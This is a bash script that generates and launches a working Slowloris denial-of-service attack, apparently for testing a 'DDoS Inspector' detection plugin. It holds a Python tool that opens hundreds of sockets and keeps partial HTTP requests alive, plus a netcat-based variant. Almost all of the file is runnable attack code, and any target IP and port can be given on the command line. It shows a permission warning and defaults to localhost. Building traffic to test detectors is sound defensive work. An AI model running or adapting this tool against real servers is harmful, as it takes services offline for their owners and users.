#!/bin/bash

# Slowloris Attack Simulation Script
# This script simulates a Slowloris attack for testing the DDoS Inspector plugin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}=== Slowloris Attack Simulation ===${NC}"

# Default parameters
TARGET_IP="127.0.0.1"
TARGET_PORT="80"
ATTACK_DURATION="60"
CONNECTIONS="200"
DELAY="15"
USER_AGENT="Mozilla/5.0 (compatible; Slowloris)"

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)
            TARGET_IP="$2"
            shift 2
            ;;
        -p|--port)
            TARGET_PORT="$2"
            shift 2
            ;;
        -d|--duration)
            ATTACK_DURATION="$2"
            shift 2
            ;;
        -c|--connections)
            CONNECTIONS="$2"
            shift 2
            ;;
        -s|--delay)
            DELAY="$2"
            shift 2
            ;;
        -u|--user-agent)
            USER_AGENT="$2"
            shift 2
            ;;
        -h|--help)
            echo "Usage: $0 [OPTIONS]"
            echo "Options:"
            echo "  -t, --target        Target IP address (default: 127.0.0.1)"
            echo "  -p, --port          Target port (default: 80)"
            echo "  -d, --duration      Attack duration in seconds (default: 60)"
            echo "  -c, --connections   Number of connections (default: 200)"
            echo "  -s, --delay         Delay between headers in seconds (default: 15)"
            echo "  -u, --user-agent    User agent string"
            echo "  -h, --help          Show this help message"
            exit 0
            ;;
        *)
            echo -e "${RED}Unknown option: $1${NC}"
            exit 1
            ;;
    esac
done

echo -e "${YELLOW}Target: ${TARGET_IP}:${TARGET_PORT}${NC}"
echo -e "${YELLOW}Duration: ${ATTACK_DURATION} seconds${NC}"
echo -e "${YELLOW}Connections: ${CONNECTIONS}${NC}"
echo -e "${YELLOW}Header delay: ${DELAY} seconds${NC}"

# Check for required tools
if ! command -v python3 &> /dev/null; then
    echo -e "${RED}Python3 not found. Please install python3${NC}"
    exit 1
fi

# Create Python script for Slowloris attack
cat > /tmp/slowloris.py << 'EOF'
#!/usr/bin/env python3
import socket
import threading
import time
import random
import sys
import signal

class SlowlorisAttacker:
    def __init__(self, target_ip, target_port, duration, connections, delay, user_agent):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.duration = int(duration)
        self.connections = int(connections)
        self.delay = int(delay)
        self.user_agent = user_agent
        self.sockets = []
        self.stop_flag = False
        
        # Handle Ctrl+C gracefully
        signal.signal(signal.SIGINT, self.signal_handler)
        
    def signal_handler(self, sig, frame):
        print("\nStopping Slowloris attack...")
        self.stop_flag = True
        self.cleanup()
        sys.exit(0)
        
    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target_ip, self.target_port))
            
            # Send partial HTTP request
            sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))
            sock.send(f"User-Agent: {self.user_agent}\r\n".encode('utf-8'))
            sock.send(f"Accept-language: en-US,en,q=0.5\r\n".encode('utf-8'))
            
            return sock
        except Exception as e:
            print(f"Error creating socket: {e}")
            return None
    
    def keep_alive(self, sock):
        try:
            # Send additional headers to keep connection alive
            headers = [
                f"X-a: {random.randint(1, 5000)}\r\n",
                f"X-b: {random.randint(1, 5000)}\r\n",
                f"X-c: {random.randint(1, 5000)}\r\n",
                f"Cache-Control: no-cache\r\n",
                f"Connection: keep-alive\r\n"
            ]
            
            header = random.choice(headers)
            sock.send(header.encode('utf-8'))
            return True
        except:
            return False
    
    def start_attack(self):
        print(f"Starting Slowloris attack against {self.target_ip}:{self.target_port}")
        print(f"Attempting to create {self.connections} connections...")
        
        # Create initial connections
        for i in range(self.connections):
            if self.stop_flag:
                break
                
            sock = self.create_socket()
            if sock:
                self.sockets.append(sock)
                
            if (i + 1) % 50 == 0:
                print(f"Created {len(self.sockets)} connections so far...")
        
        print(f"Successfully created {len(self.sockets)} connections")
        
        # Keep connections alive
        start_time = time.time()
        iteration = 0
        
        while not self.stop_flag and (time.time() - start_time) < self.duration:
            iteration += 1
            active_sockets = []
            
            print(f"Iteration {iteration}: Maintaining {len(self.sockets)} connections...")
            
            for sock in self.sockets:
                if self.keep_alive(sock):
                    active_sockets.append(sock)
                else:
                    # Try to replace dead socket
                    try:
                        sock.close()
                    except:
                        pass
                    
                    new_sock = self.create_socket()
                    if new_sock:
                        active_sockets.append(new_sock)
            
            self.sockets = active_sockets
            print(f"Active connections: {len(self.sockets)}")
            
            # Wait before next iteration
            time.sleep(self.delay)
        
        print("Attack duration completed")
        self.cleanup()
    
    def cleanup(self):
        print("Closing connections...")
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets = []

if __name__ == "__main__":
    if len(sys.argv) != 7:
        print("Usage: python3 slowloris.py <target_ip> <target_port> <duration> <connections> <delay> <user_agent>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    duration = sys.argv[3]
    connections = sys.argv[4]
    delay = sys.argv[5]
    user_agent = sys.argv[6]
    
    attacker = SlowlorisAttacker(target_ip, target_port, duration, connections, delay, user_agent)
    attacker.start_attack()
EOF

# Alternative simple slowloris implementation using curl and netcat
cat > /tmp/simple_slowloris.sh << 'EOF'
#!/bin/bash

TARGET_IP=$1
TARGET_PORT=$2
DURATION=$3
CONNECTIONS=$4

echo "Starting simple Slowloris with curl/nc..."

# Function to create slow connection
slow_connection() {
    local id=$1
    {
        printf "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: SlowHTTPTest\r\n" "$TARGET_IP"
        sleep 10
        printf "Accept: text/html\r\n"
        sleep 10
        printf "Connection: keep-alive\r\n"
        sleep 10
        printf "Accept-Language: en-US\r\n"
        sleep $DURATION
    } | nc $TARGET_IP $TARGET_PORT &
}

# Create multiple slow connections
for i in $(seq 1 $CONNECTIONS); do
    slow_connection $i
    if [ $((i % 10)) -eq 0 ]; then
        echo "Created $i connections..."
        sleep 1
    fi
done

echo "All connections created. Waiting for completion..."
wait
echo "Simple Slowloris completed"
EOF

chmod +x /tmp/simple_slowloris.sh

# Warning message
echo -e "${RED}WARNING: This will generate slow HTTP attack traffic!${NC}"
echo -e "${RED}Only use this against systems you own or have permission to test!${NC}"
echo -e "${YELLOW}Press Ctrl+C to abort, or wait 5 seconds to continue...${NC}"
sleep 5

echo -e "${GREEN}Starting Slowloris attack...${NC}"

# Check if netcat is available for simple method
if command -v nc &> /dev/null && [ $CONNECTIONS -le 50 ]; then
    echo -e "${GREEN}Using simple netcat-based Slowloris (for smaller attacks)...${NC}"
    /tmp/simple_slowloris.sh "$TARGET_IP" "$TARGET_PORT" "$ATTACK_DURATION" "$CONNECTIONS" &
    SIMPLE_PID=$!
fi

# Use Python implementation for more sophisticated attack
echo -e "${GREEN}Using Python-based Slowloris...${NC}"
python3 /tmp/slowloris.py "$TARGET_IP" "$TARGET_PORT" "$ATTACK_DURATION" "$CONNECTIONS" "$DELAY" "$USER_AGENT" &
PYTHON_PID=$!

# Show progress
echo -e "${GREEN}Slowloris attack in progress...${NC}"
echo -e "${YELLOW}The attack will maintain connections for ${ATTACK_DURATION} seconds${NC}"
echo -e "${YELLOW}Press Ctrl+C to stop early${NC}"

# Wait for completion
wait $PYTHON_PID 2>/dev/null || true

if [[ -n $SIMPLE_PID ]]; then
    kill $SIMPLE_PID 2>/dev/null || true
fi

# Clean up temporary files
rm -f /tmp/slowloris.py /tmp/simple_slowloris.sh

echo -e "${GREEN}Slowloris attack simulation completed!${NC}"
echo -e "${YELLOW}Check your DDoS Inspector logs for detection results.${NC}"
echo -e "${YELLOW}Check your web server logs for connection patterns.${NC}"

